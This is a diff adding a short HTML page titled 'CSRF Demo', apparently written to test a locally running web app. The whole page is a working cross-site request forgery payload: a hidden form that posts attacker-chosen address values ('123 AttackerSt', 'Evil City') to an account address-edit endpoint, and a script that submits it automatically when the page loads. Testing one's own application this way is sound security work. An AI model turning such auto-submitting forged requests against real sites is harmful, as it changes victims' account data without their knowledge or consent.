@@ -1,0 +1,18 @@
+<!DOCTYPE html>
+<html>
+<body>
+<h1>CSRF Demo</h1>
+
+<!-- This form targets your vulnerable edit-address endpoint -->
+<form id="csrfForm" action="http://127.0.0.1:5000/account/address/edit?id=12" method="POST">
+  <input type="hidden" name="province" value="123 AttackerSt">
+  <input type="hidden" name="city" value="Evil City hause art  ">
+  <input type="hidden" name="contact_name" value="David">
+</form>
+
+<script>
+  // Auto-submit the form immediately
+  document.getElementById('csrfForm').submit();
+</script>
+</body>
+</html>
